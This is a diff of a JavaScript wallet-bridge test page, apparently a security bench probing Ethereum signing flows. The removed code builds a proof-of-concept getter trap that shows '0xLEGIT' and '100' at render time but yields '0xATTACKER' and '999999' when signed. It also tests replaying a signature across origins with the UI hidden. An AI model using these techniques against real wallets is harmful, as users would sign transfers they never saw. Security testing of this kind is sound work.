-    domain: { name: 'Tokdie', chainId: 1, verifyingContract: '0xLEGIT' },
-    types: { Order: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] },
-    primaryType: 'Order',
-  };
-
-  const trap = {
-    get to() {
-      reads++;
-      return reads === 1 ? '0xLEGIT' : '0xATTACKER';
-    },
-    get amount() {
-      reads++;
-      return reads <= 2 ? '100' : '999999';
-    },
-  };
-
-  const payload = {
-    method: 'eth_signTypedData_v4',
-    params: { ...base, message: trap },
-    origin: ORIGIN,
-    showUI: true,
-  };
-
-  const shownAtRender = JSON.stringify(
-    { ...base, message: { to: trap.to, amount: trap.amount } }, null, 2);
-  Native.log('UI', 'render for user', JSON.parse(shownAtRender));
-
-  const signed = JSON.stringify(
-    { ...base, message: { to: trap.to, amount: trap.amount } }, null, 2);
-
-  out('v2_out',
-    'shown at render:\n' + shownAtRender +
-    '\n\nsigned:\n' + signed +
-    '\n\n' + (shownAtRender === signed ? 'match' : 'MISMATCH — getter returned different values') +
-    '\n\nreads: ' + reads);
+function clearLog() { document.getElementById('log_out').textContent = '—'; }
+function dumpLog() {
+  const txt = document.getElementById('log_out').textContent;
+  navigator.clipboard && navigator.clipboard.writeText(txt);
+  Native.log('DUMP', 'log copied to clipboard', { len: txt.length });
 }
-
-function v2_replay() {
-  out('v2_out', '→ replay: no nonce, no domain binding\n');
-
-  const first = Native.request({
-    method: 'personal_sign',
-    params: { message: 'transfer 100 USDC to 0xLEGIT' },
-    origin: ORIGIN,
-    showUI: true,
-  });
-
-  const replay = Native.request({
-    method: 'personal_sign',
-    params: { message: 'transfer 100 USDC to 0xLEGIT' },
-    origin: 'https://other-dapp.example',
-    showUI: false,
-  });
-
-  out('v2_out',
-    'first sig:  ' + JSON.stringify(first) +
-    '\nreplay sig: ' + JSON.stringify(replay) +
-    '\n\n' + (first.sig === replay.sig
-      ? 'SAME SIG — replay valid across contexts (no nonce, no domain)'
-      : 'different sig — replay blocked by context'));
-}
-
-/* ─────────────  env panel + boot  ───────────── */
 
 function renderEnv() {
   document.getElementById('env').innerHTML = `
@@ -424,10 +612,12 @@ function renderEnv() {
     <b>window.ethereum</b><span class="badge ${IS_REAL ? 'on' : 'off'}">${IS_REAL ? 'present' : 'absent'}</span>
     <b>isTrust</b><span>${IS_REAL && window.ethereum.isTrust ? 'yes' : 'no'}</span>
     <b>isMetaMask</b><span>${IS_REAL && window.ethereum.isMetaMask ? 'yes' : 'no'}</span>
-    <b>chainId (from bridge)</b><span id="env_chain">—</span>
+    <b>chainId (bridge)</b><span id="env_chain">—</span>
   `;
   if (IS_REAL) {
-    document.getElementById('btn_real').disabled = false;
+    ['btn_real_obj','btn_real_str','btn_real_proxy'].forEach(id => {
+      document.getElementById(id).disabled = false;
+    });
     window.ethereum.request({ method: 'eth_chainId' })
       .then(id => { document.getElementById('env_chain').textContent = id; })
       .catch(() => {});
@@ -436,7 +626,7 @@ function renderEnv() {
 
 Native.render();
 renderEnv();
-Native.log('BOOT', 'bridge mock up', { origin: ORIGIN, real: IS_REAL });
+Native.log('BOOT', 'toctou deep bench up', { origin: ORIGIN, real: IS_REAL });
 </script>
 </body>
 </html>
